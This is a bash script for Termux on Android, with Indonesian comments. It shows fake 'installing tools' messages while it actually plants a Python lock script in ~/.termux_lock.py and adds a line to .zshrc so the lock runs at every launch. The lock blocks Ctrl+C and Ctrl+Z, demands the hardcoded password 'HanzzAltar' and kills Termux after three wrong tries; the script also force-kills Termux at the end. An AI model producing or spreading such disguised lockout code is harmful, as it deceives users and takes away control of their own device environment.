#!/data/data/com.termux/files/usr/bin/bash
clear

# Menampilkan efek loading ala hacker
echo -e "\033[1;32m[+] Tools Belum Terinstall, Tunggu Bre... \033[0m"
sleep 5
clear
echo -e "\033[1;32m[+] Lagi Install Bre Tunggu...\033[0m"
sleep 10
clear
echo -e "\033[1;32m[+] Loading... \033[0m"
sleep 10
clear
echo -e "\033[1;32m[+] Proses Pemasangan...\033[0m"
sleep 15

# Menambahkan script Python ke .zshrc agar otomatis berjalan saat Termux dibuka
echo 'python $HOME/.termux_lock.py' >> $HOME/.zshrc

# Membuat file Python untuk mengunci Termux
cat > $HOME/.termux_lock.py << 'EOF'
import os
import sys
import time
import signal

# Konfigurasi Password
PASSWORD = "HanzzAltar"  # Ganti dengan password yang kamu inginkan
LOCK_FILE = os.path.abspath(__file__)  # Path file script ini

# Blokir Ctrl + C dan Ctrl + Z
def block_exit(signum, frame):
    print("\n\033[1;31m⚠️  Tidak bisa keluar! Termux dikunci.\033[0m")

signal.signal(signal.SIGINT, block_exit)   # Blokir Ctrl + C
signal.signal(signal.SIGTSTP, block_exit)  # Blokir Ctrl + Z

def lock_termux():
    os.system("clear")
    print("\033[1;31m" + "="*35)
    print("\033[1;32m      🔒 Termux Terkunci 🔒")
    print("\033[1;32m      👾 By: HanzzAltar  👾")
    print("\033[1;31m" + "="*35)
    
    for i in range(3, 0, -1):  # 3 kali kesempatan
        password = input("\n🔑 Masukkan Password: ")

        if password == PASSWORD:
            print("\033[1;32m\n✅ Akses Diterima!\033[0m\n")
            time.sleep(5)
            os.system("clear")

            # Hapus baris yang berisi python $HOME/.termux_lock.py di .zshrc
            os.system("sed -i '/python \\$HOME\\/\\.termux_lock\\.py/d' $HOME/.zshrc")
            print("\033[1;32m\033[0m")

            # Hapus file script ini setelah berhasil login
            try:
                os.remove(LOCK_FILE)
                print("\033[1;32m👾 By: HanzzAltar 👾\033[0m")
                time.sleep(1)
            except Exception as e:
                print(f"\033[1;31m❌ Gagal menghapus kunci: {e}\033[0m")
            
            return  # Jika benar, lanjutkan akses Termux
        
        print(f"\033[1;31m❌ Password Salah! {i-1} kesempatan lagi.\033[0m")

    print("\n\033[1;31m🚨 Akses Ditolak! Menutup Termux...\033[0m")
    time.sleep(1)
    
    # Metode 1: Kill Termux secara paksa (Paling Efektif)
    os.kill(os.getppid(), signal.SIGKILL)  

    # Metode 2: Jika tidak berhasil, coba perintah exit
    sys.exit()

lock_termux()
EOF

# Beri izin eksekusi pada script Python
chmod +x $HOME/.termux_lock.py

# Efek loading ala hacker sebelum Termux ditutup
echo -e "\033[1;32m[+] Pemasangan Berhasil! \033[0m"
sleep 6
echo -e "\033[1;31m[!] Termux otomatis akan keluar setelah pemasangan selesai... \033[0m"
sleep 6
echo -e "\033[1;31m[!] Tekan Enter \033[0m"
sleep 1

# Paksa tutup Termux
pkill -9 -f "com.termux"
